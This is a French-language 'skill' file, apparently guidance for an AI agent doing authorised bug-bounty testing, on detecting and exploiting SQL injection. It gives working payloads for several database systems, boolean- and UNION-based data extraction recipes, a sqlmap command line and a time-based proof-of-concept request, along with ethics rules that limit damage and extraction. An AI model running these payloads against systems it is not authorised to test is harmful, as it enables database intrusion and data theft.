# Skill — SQL Injection

Méthodologie pour détecter et exploiter une SQLi sans endommager la base.

## 1. Détection

### Tests passifs (safe)

| Test | Signal |
|------|--------|
| `'` | Erreur SQL ou 500 |
| `' OR '1'='1` vs `' OR '1'='2` | Diff body = boolean-based |
| `'||sleep(5)||'` (MySQL) | Latence 5s = time-based |
| `' AND 1=CONVERT(int,@@version)--` | Leak version via error = error-based |
| `,(SELECT 0x...)` en paramètre ORDER BY | Diff de tri = stackable |

### Paramètres les plus vulnérables
- `?id=`, `?user=`, `?order=`, `?sort=`, `?limit=`, `?offset=`
- Headers : `X-Forwarded-For`, `User-Agent` (si loggé et reflété quelque part)
- JSON body sur API REST (essaie `"id": "1 OR 1=1"`)

## 2. Payloads par DBMS

### MySQL / MariaDB
```sql
' UNION SELECT null,@@version,null-- -
' AND SLEEP(5)-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
```

### PostgreSQL
```sql
'||(SELECT pg_sleep(5))||'
' UNION SELECT null,current_database(),null-- -
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'-- -
' UNION SELECT null,@@version,null-- -
```

### Oracle
```sql
' UNION SELECT null,banner,null FROM v$version-- -
' AND 1=dbms_pipe.receive_message(('a'),5)-- -
```

### SQLite
```sql
' UNION SELECT null,sqlite_version(),null-- -
```

## 3. Boolean-based extraction

Pattern générique pour exfiltrer caractère par caractère :

```
' AND SUBSTRING((SELECT database()),1,1)='a'-- -
' AND SUBSTRING((SELECT database()),1,1)='b'-- -
...
```

Binary search pour aller vite (code ASCII) :
```
' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 100-- -
```

## 4. UNION-based — recette

1. Trouver le nombre de colonnes :
   ```
   ' ORDER BY 1-- -    (vrai)
   ' ORDER BY 10-- -   (erreur) → entre 1 et 10
   ```
2. Trouver les colonnes affichées :
   ```
   ' UNION SELECT 1,2,3,4,5-- -
   ```
3. Exfiltrer :
   ```
   ' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -
   ```

## 5. Outils

- **Manuel d'abord**, sqlmap ensuite si l'utilisateur approuve :
  ```bash
  sqlmap -u "https://target.com/item?id=1" --batch --level=3 --risk=2 --random-agent
  ```
- `--dbms=mysql` pour réduire le bruit si tu connais déjà le DBMS
- `--technique=BT` (boolean + time) pour éviter les payloads bruyants

## 6. Règles éthiques

- **Jamais** `DROP`, `DELETE`, `UPDATE`, `INSERT` sans autorisation écrite du programme.
- **Jamais** `LOAD_FILE`, `INTO OUTFILE`, `xp_cmdshell` sans autorisation — c'est du RCE.
- Limite l'extraction à **un seul row** pour prouver la faille (ex: `LIMIT 1`).
- Si tu dump une table sensible par accident, **arrête immédiatement** et signale à l'utilisateur.

## 7. Impact

- **Medium** : erreur SQL reflétée, pas d'exfil démontrable
- **High** : extraction de données non-publiques via boolean/time
- **Critical** : UNION/stacked → exfil massive, ou RCE via `xp_cmdshell`/`INTO OUTFILE`

## 8. PoC format

```http
GET /api/item?id=1'%20AND%20SLEEP(5)--%20- HTTP/1.1
Host: target.com
```

Avec mesure du temps (`curl -o /dev/null -s -w "%{time_total}\n"`).
